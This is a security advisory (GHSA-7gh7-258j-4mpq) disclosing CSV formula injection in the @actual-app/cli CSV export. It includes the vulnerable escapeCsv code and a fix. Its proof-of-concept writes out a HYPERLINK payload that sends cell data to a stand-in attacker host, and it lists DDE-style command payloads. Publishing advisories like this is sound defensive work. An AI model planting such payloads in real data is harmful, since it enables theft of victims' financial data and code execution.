# [M] @actual-app/cli `--format csv` Output Vulnerable to CSV Formula Injection via Custom `escapeCsv` Helper

## Summary
Severity: Medium
Advisory: GHSA-7gh7-258j-4mpq
CVE: CVE-2026-46672
CWE: CWE-1236
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-7gh7-258j-4mpq
Type: github-advisory

## Affected
- npm: `@actual-app/cli` — affected >=0 <26.6.0

## Details
## Summary

`@actual-app/cli` ships a hand-rolled CSV serializer in `packages/cli/src/output.ts` (used whenever the global `--format csv` option is passed) whose `escapeCsv` helper only handles RFC 4180 delimiter/quote/newline escaping. It does **not** neutralize the standard CSV formula-injection prefixes (`=`, `+`, `-`, `@`, `\t`, `\r`). Any CLI command that streams an object array containing user-controlled strings — `transactions list`, `accounts list`, `payees list`, `categories list`, `tags list`, `category-groups list`, `rules list`, `schedules list`, `query` — will emit cells that auto-evaluate when the resulting CSV is opened in Excel, LibreOffice Calc, or Google Sheets, enabling data exfiltration (`=HYPERLINK(...)`, `=WEBSERVICE(...)`) and arbitrary formula execution.

This is a **distinct variant** of the formula-injection surface in `packages/loot-core/src/server/transactions/export/export-to-csv.ts` (which uses `csv-stringify` and would need a separate `cast` option fix) — they are different files, different packages, and different serializers. Fixing one does not fix the other.

## Details

### Vulnerable code

`packages/cli/src/output.ts:98-103`:

```ts
function escapeCsv(value: string): string {
  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
    return '"' + value.replace(/"/g, '""') + '"';
  }
  return value;
}
```

The helper performs only delimiter/quote/newline neutralization, which is sufficient for RFC 4180 *parsing* but irrelevant to spreadsheet *formula evaluation*. CSV double-quoting is invisible to Excel/Calc/Sheets — the unquoted cell value `=HYPERLINK("http://attacker/?d="&B2,"Click")` is still parsed as a formula by the spreadsheet, even when wrapped as `"=HYPERLINK(""http://attacker/?d=""&B2,""Click"")"` on disk.

### Data flow to the sink

1. The global `--format` option is registered at `packages/cli/src/index.ts:53-57` with `choices(['json','table','csv'])` and applies to every subcommand.
2. List/query subcommands invoke `printOutput(data, format)` (`output.ts:105-107`), which routes `format === 'csv'` to `formatCsv` (`output.ts:71-96`).
3. For each row, every column is run through `formatCellValue` (`output.ts:21-26`):
   ```ts
   function formatCellValue(key: string, value: unknown): string {
     if (isAmountValue(key, value)) {
       return (value / 100).toFixed(2);
     }
     return String(value ?? '');
   }
   ```
   Only the fixed `AMOUNT_FIELDS` set (`amount`, `balance`, `budgeted`, etc.) gets numeric coercion. User-controlled string fields — `payee.name`, `account.name`, `category.name`, `notes`, tag names, rule descriptions, schedule names — are passed verbatim to `escapeCsv`.
4. `escapeCsv` returns the value unmodified unless it contains `,`, `"`, or `\n`. A payload such as `=1+1`, `@SUM(...)`, `+1+cmd|'/c calc'!A0`, or `-2+3+cmd|'/c calc'!A0` therefore lands in the output as a leading-character formula.

### Exploitability conditions

- The CLI is installed and used by the victim (`@actual-app/cli` is published with `"bin": { "actual": "./dist/cli.js", "actual-cli": "./dist/cli.js" }`).
- The attacker can persist a malicious string in any user-controlled field of the budget. Realistic vectors:
  - Co-user / co-collaborator of a synced budget (multi-device, or attacker-controlled sync server).
  - Sending the victim a crafted OFX/QIF/CSV import file.
  - API write access (e.g., over a compromised sync session).
- The victim runs `actual <list-cmd> --format csv > out.csv` and opens `out.csv` in a spreadsheet program. CSV files generated locally by the CLI are not gated by Office Protected View / Mark-of-the-Web, so formulas evaluate immediately.

There are **no mitigations** in the code path: no allowlist, no sanitizer, no `cast` option, no warning, and the CLI is shipped to end users via npm.

## PoC

Setup (one-time — choose any user-controlled field; payee shown):

```bash
# Inject via the CLI's own write path (or via OFX/QIF/CSV import, or shared sync):
actual transactions add \
  --account "$ACCOUNT_ID" \
  --data '[{"payee_name":"=HYPERLINK(\"http://attacker.evil/leak?d=\"&B2,\"Bank refund\")","date":"2026-01-01","amount":10000}]'
```

Trigger (victim runs):

```bash
actual transactions list --account "$ACCOUNT_ID" --start 2026-01-01 --end 2026-12-31 --format csv > out.csv
cat out.csv
```

Observed output (abridged; quoting is RFC 4180-correct but the formula prefix is preserved):

```
id,date,amount,payee,notes,category,account,cleared,reconciled
abc...,2026-01-01,100.00,"=HYPERLINK(""http://attacker.evil/leak?d=""&B2,""Bank refund"")",,,Checking,false,false
```

Open `out.csv` in Excel / LibreOffice Calc / Google Sheets → the `payee` cell renders as a clickable hyperlink that, when clicked (or auto-fetched in some configurations), exfiltrates neighboring cell content (`B2` = the date, but trivially adjustable to any cell) to the attacker.

Minimal-payload variants that bypass `escapeCsv` entirely (no `,`, `"`, or `\n` → no quoting at all):

- Payee name `=1+1` → cell shows `2`.
- Payee name `@SUM(1+1)` → cell shows `2`.
- Payee name `+1+1` → cell shows `2`.
- Payee name `-2+3` → cell shows `1`.

The same applies to other list commands sharing the global `--format` option:

```bash
actual accounts list   --format csv      # account.name
actual payees   list   --format csv      # payee.name
actual categories list --format csv      # category.name
actual tags list       --format csv
actual category-groups list --format csv
actual rules list      --format csv
actual schedules list  --format csv
actual query "..."     --format csv
```

Verified by reading `escapeCsv` (`packages/cli/src/output.ts:98-103`): the only escape triggers are `,`, `"`, `\n`, and even when triggered the leading character is preserved.

## Impact

- **Data exfiltration** in the victim's spreadsheet context via `=HYPERLINK(...)`, `=WEBSERVICE(...)`, `=IMPORTXML(...)` (Sheets), `=IMPORTDATA(...)` (Sheets) — typically one click for HYPERLINK, fully automatic for WEBSERVICE/IMPORT* on confirmation. Victim's financial data (account names, balances, transactions in adjacent cells) is the natural exfil target.
- **Arbitrary formula execution** in the victim's spreadsheet context, including legacy DDE-style payloads on outdated Excel installations (potential RCE).
- **Trust-boundary crossing**: financial data the victim assumes is "exported" becomes attacker-controlled active content. The CLI is the victim's own trusted tool; users do not expect `actual transactions list --format csv` to produce a file that runs code.

Blast radius is bounded by the requirement that the attacker plant a string in a user-controlled field and the victim opens the CSV in a spreadsheet — but both are realistic for a personal-finance app whose primary export workflow is "open in Excel".

## Recommended Fix

Neutralize formula-trigger prefixes in `escapeCsv` *before* the existing RFC 4180 quoting. Example:

```ts
// packages/cli/src/output.ts
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

function escapeCsv(value: string): string {
  // Neutralize spreadsheet formula prefixes (CWE-1236).
  if (FORMULA_TRIGGERS.test(value)) {
    value = "'" + value;
  }
  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
    return '"' + value.replace(/"/g, '""') + '"';
  }
  return value;
}
```

The leading single-quote is the OWASP-recommended neutralizer: it is stripped by Excel/Calc on display but prevents formula evaluation. Apply the same fix in `packages/loot-core/src/server/transactions/export/export-to-csv.ts` by passing a `cast` option to `csv-stringify` that prepends `'` to any string starting with a formula trigger — the two sites are independent and both must be patched.

## References
- https://github.com/actualbudget/actual/security/advisories/GHSA-7gh7-258j-4mpq
- https://github.com/actualbudget/actual
